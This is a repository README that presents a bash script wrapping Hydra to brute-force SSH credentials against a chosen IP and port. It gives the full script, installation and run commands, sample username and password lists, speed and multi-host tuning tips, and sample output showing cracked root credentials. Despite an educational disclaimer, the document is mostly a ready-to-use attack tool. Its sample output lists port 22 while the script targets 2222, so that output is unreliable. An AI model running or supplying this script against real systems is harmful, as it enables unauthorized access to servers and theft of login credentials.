
---

# **SSH Brute-Force Automation Script Using Hydra**

This repository contains a **custom bash script** that uses **Hydra** to **brute-force SSH credentials** on a specified target IP and port. The script attempts to find valid SSH credentials by trying different username and password combinations from predefined wordlists.

---

## **⚠️ Disclaimer**
This project is for **educational purposes only**. Unauthorized access or brute-forcing is **illegal** and **punishable by law**. Use this script only in authorized penetration testing environments.

---

# **How It Works**
1. Defines the **target IP address** and **port**.
2. Reads **username** and **password lists** from text files (`users.txt` and `pass.txt`).
3. Uses **Hydra** to perform a **brute-force SSH attack**.
4. Stores **valid credentials** (if found) in `valid_credentials.txt`.

---

## **Script Overview**
```bash
#!/bin/bash

# Define the target IP address and port
TARGET_IP="192.168.8.144"  # Replace with target IP
TARGET_PORT=2222

# Define the path to the username and password files
USER_LIST="users.txt"
PASSWORD_LIST="pass.txt"

# Output file to store valid credentials
OUTPUT_FILE="valid_credentials.txt"

# Check if Hydra is installed
if ! command -v hydra &> /dev/null; then
    echo "Hydra is not installed. Please install it and try again."
    exit 1
fi

# Run Hydra to brute-force SSH credentials
echo "Starting brute force attack with Hydra..."
hydra -L "$USER_LIST" -P "$PASSWORD_LIST" ssh://$TARGET_IP -s $TARGET_PORT -o $OUTPUT_FILE

# Check if valid credentials were found
if [ -s "$OUTPUT_FILE" ]; then
    echo "Brute force attack completed. Valid credentials found:"
    cat "$OUTPUT_FILE"
else
    echo "No valid credentials found."
fi
```

---

## **Installation and Usage**

### **1. Install Hydra (if not already installed):**
```bash
sudo apt update
sudo apt install hydra -y
```

---

### **2. Clone the Repository**
```bash
git clone https://github.com/YOUR_USERNAME/ssh-brute-force-script.git
cd ssh-brute-force-script
```

---

### **3. Create Username and Password Files**
```bash
# Create a sample username list
echo -e "admin\nroot\nuser" > users.txt

# Create a sample password list
echo -e "password\n123456\nadmin" > pass.txt
```

---

### **4. Run the Script**
```bash
chmod +x script3.sh
./script3.sh
```

---

## **Customizing the Script**
1. **Change the Target IP and Port:**
   ```bash
   TARGET_IP="192.168.8.144"   # Replace with your target
   TARGET_PORT=2222            # Custom SSH port
   ```

2. **Update Username and Password Files:**
   ```bash
   USER_LIST="users.txt"   # Username wordlist
   PASSWORD_LIST="pass.txt" # Password wordlist
   ```

3. **Check Valid Credentials:**
   - If Hydra finds **valid credentials**, they will be saved in `valid_credentials.txt`.
   - Use:
     ```bash
     cat valid_credentials.txt
     ```

---

## **Expected Output**
```text
Starting brute force attack with Hydra...
[22][ssh] host: 192.168.8.144   login: root   password: toor

Brute force attack completed. Valid credentials found:
[22][ssh] host: 192.168.8.144   login: root   password: toor
```

---

# **Advanced Features**
- **Hydra Options to Customize:**
  - **Tuning Speed:** Add `-t 4` for 4 parallel tasks.
  - **Verbose Mode:** Use `-V` to see every attempt.
  - **Target Multiple Hosts:** Add multiple IPs in a file.

---

## **Security Recommendations**
- Use this script only in **authorized environments**.
- Ensure **legal authorization** before conducting penetration testing.

---

# **License**
This project is licensed under the **MIT License**. See the `LICENSE` file for details.

---
